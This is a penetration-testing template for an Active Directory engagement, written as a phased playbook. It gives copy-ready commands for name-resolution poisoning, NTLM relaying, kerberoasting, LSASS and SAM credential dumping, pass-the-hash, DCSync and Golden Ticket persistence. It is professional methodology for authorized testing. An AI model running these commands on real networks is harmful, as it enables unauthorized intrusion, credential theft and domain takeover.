+++
title = "Template: Sample Engagement"
+++

- Ref: https://archive.ph/i6AeU

### Phase 1: Initial Reconnaissance & Network Mapping

*   **Host Discovery:** Perform a quick Nmap scan to identify live hosts and common services.
    - `nmap -T4 -p 21,22,23,53,80,139,443,445,3389 --open -iL <scope.txt> -oG nmap_quick`
*   **Web Service Screenshotting:** Use **gowitness** or **EyeWitness** on discovered web ports (80, 443, 8080, etc.) to visually identify interesting applications.
    - `gowitness nmap -f nmap_quick`
*   **Full Port Scan:** Run a comprehensive Nmap scan in the background on all live hosts to discover non-standard services.
    - `nmap -T4 -p- -sV -sC -iL <live_hosts.txt> -oA nmap_full`
*   **Vulnerability Scanning:** Run a **Nessus** (or equivalent) authenticated scan.
    - *Note: This is primarily for the client's benefit to identify patching gaps. Exploits from this are secondary to credential-based attacks.*
*   **Identify Relay Targets:** Use **`netexec`** to find hosts with SMB signing disabled, creating a target list for relay attacks.
    - `nxc smb <CIDR> --gen-relay-list smb_relay_targets.txt`

### Phase 2: Initial Access & Foothold

*   **LLMNR/NBT-NS Poisoning:** Start **Responder** to poison local name resolution and capture NTLMv2 hashes from hosts on the same broadcast domain.
    - `responder -I <interface> -dwPv`
*   **NTLM Relay Attack:** In parallel with Responder, run **Impacket's ntlmrelayx.py** to relay captured hashes to the list of SMB-signing-disabled hosts. The goal is to execute a command or dump local hashes.
    - `ntlmrelayx.py -tf smb_relay_targets.txt --smb2support -c "whoami"`
*   **AD CS Enumeration (Critical):** Use **Certipy** to find vulnerable certificate templates in Active Directory Certificate Services. This is a primary vector for privilege escalation.
    - `certipy find -u '<user>' -p '<password>' -dc-ip <DC_IP> -vulnerable -enabled`
*   **Anonymous Enumeration:** Check for anonymous access to SMB shares and LDAP.
    - `nxc smb <CIDR> -u '' -p '' --shares`
*   **Offline Password Cracking:** Use **Hashcat** on any captured NTLMv2 hashes. A successful crack provides the first set of valid user credentials.
    - `hashcat -m 5600 hashes.txt /path/to/wordlist.txt`

### Phase 3: Post-Compromise Situational Awareness

*At this point, we assume a valid user credential (username/password or hash) has been acquired.*

*   **BloodHound Data Collection:** Run the **SharpHound** ingestor to collect AD data. This is the most critical step to visualize attack paths.
    - `SharpHound.exe -c All`
*   **Kerberoasting:** Use **Rubeus** or **Impacket's GetUserSPNs.py** to request service tickets (TGS) for accounts with Service Principal Names (SPNs). Attempt to crack these offline with Hashcat.
    - `Rubeus.exe kerberoast /outfile:kerberoast_hashes.txt`
*   **Enumerate User Privileges:** Use **`netexec`** with the obtained credential to determine where the user has local administrator rights.
    - `nxc smb <CIDR> -u '<user>' -p '<password>' --local-auth`
*   **Host-Based Enumeration:** On any system where you have access (even as a low-privilege user), run situational awareness tools like **Seatbelt** to find sensitive data, saved browser credentials, or misconfigurations.
    - `Seatbelt.exe -group=all`

### Phase 4: Privilege Escalation & Lateral Movement

*   **Pivoting with Admin Rights:** If the user has local admin rights on a machine, pivot to it.
*   **Credential Dumping:** Dump credentials from the compromised machine's memory (LSASS) and SAM database.
    - `nxc smb <target_IP> -u '<user>' -p '<password>' --local-auth -M lsassy`
    - `nxc smb <target_IP> -u '<user>' -p '<password>' --local-auth --sam`
*   **Pass-the-Hash:** Use the dumped local administrator hash to move laterally to other workstations, leveraging the common practice of local admin password reuse.
    - `nxc smb <CIDR> -u Administrator -H <ntlm_hash> --local-auth`
*   **Analyze BloodHound Data:** Ingest the collected data into the BloodHound UI. Look for:
    - Shortest paths to Domain Admins.
    - Users with dangerous rights (GenericAll, WriteDACL) over other objects.
    - Domain Admins logged into workstations where you now have local admin access.

### Phase 5: Domain Dominance

*   **Targeting Domain Admin Sessions:** Using BloodHound, identify a workstation where a Domain Admin is logged in and you have local admin rights.
*   **DA Credential Extraction:** Pivot to that machine and dump credentials from LSASS. Capturing a DA's ticket or hash from memory is often the final step.
    - `mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit`
*   **Process Injection (If Needed):** If credentials are not in LSASS but the DA is logged on, gain an interactive shell and inject into a process owned by the DA to inherit their permissions.
*   **DCSync:** Once DA-equivalent privileges are obtained, use **Impacket's secretsdump.py** or **mimikatz** to perform a DCSync attack, dumping all NTLM hashes from the Domain Controller.
    - `secretsdump.py <domain>/<DA_user>:<password>@<DC_IP> -just-dc-ntlm`
*   **Persistence:** Create a **Golden Ticket** using the `krbtgt` hash obtained from the DCSync to maintain persistent access to the entire domain.